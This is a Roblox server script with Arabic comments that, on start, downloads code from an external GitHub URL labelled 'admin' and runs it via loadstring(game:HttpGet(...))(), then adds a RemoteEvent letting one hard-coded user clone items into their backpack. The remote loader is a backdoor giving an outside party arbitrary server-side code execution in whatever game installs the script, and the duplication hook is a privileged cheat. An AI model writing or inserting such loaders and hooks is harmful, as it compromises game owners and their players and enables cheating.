-- Server-side Script (ضعه في ServerScriptService)
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

-- رابط الكود الخارجي (اللي تبي يشغّل)
local remoteCodeUrl = "https://github.com/fffmmmmf2-cyber/faisal-script/raw/refs/heads/main/admin"

-- === محاولة تنفيذ السطر الصريح داخل pcall ===
local ok_run, run_err = pcall(function()
    -- السطر الذي طلبته بالضبط
    loadstring(game:HttpGet(remoteCodeUrl))()
end)
if ok_run then
    print("تم تنفيذ loadstring(...)() بنجاح")
else
    warn("فشل تنفيذ loadstring(...)() : "..tostring(run_err))
end
-- ==============================================

-- إنشاء DuplicateEvent في ReplicatedStorage إذا ما كان موجود
local duplicateEvent = ReplicatedStorage:FindFirstChild("DuplicateEvent")
if not duplicateEvent then
    duplicateEvent = Instance.new("RemoteEvent")
    duplicateEvent.Name = "DuplicateEvent"
    duplicateEvent.Parent = ReplicatedStorage
    print("DuplicateEvent أنشئ في ReplicatedStorage")
else
    print("DuplicateEvent موجود بالفعل")
end

-- السماح فقط لهذا اليوزر (UserId من رابط البروفايل اللي أعطيت)
local ALLOWED_USER_ID = 4820552697

-- وظيفة التدبيل على السيرفر مع تقييد للمصرح لهم فقط
duplicateEvent.OnServerEvent:Connect(function(player)
    if not player or not player.Parent then return end

    -- تحقق صلاحية اللاعب
    if player.UserId ~= ALLOWED_USER_ID then
        -- تسجيل محاولة غير مصرح بها
        warn(("Player %s (UserId=%s) حاول استخدام DuplicateEvent لكنه غير مصرح"):format(player.Name, tostring(player.UserId)))
        return
    end

    -- تأكد من وجود شخصية للاعب
    local char = player.Character
    if not char then return end

    -- ابحث عن أداة في الشخصية أو في الحقيبة
    local tool = char:FindFirstChildOfClass("Tool") or player.Backpack:FindFirstChildOfClass("Tool")
    if not tool then
        return
    end

    -- استنساخ الأداة وإرسالها للحقيبة
    local cloned = tool:Clone()
    cloned.Parent = player.Backpack

    print(("Player %s duplicated tool %s"):format(player.Name, tool.Name))
end)
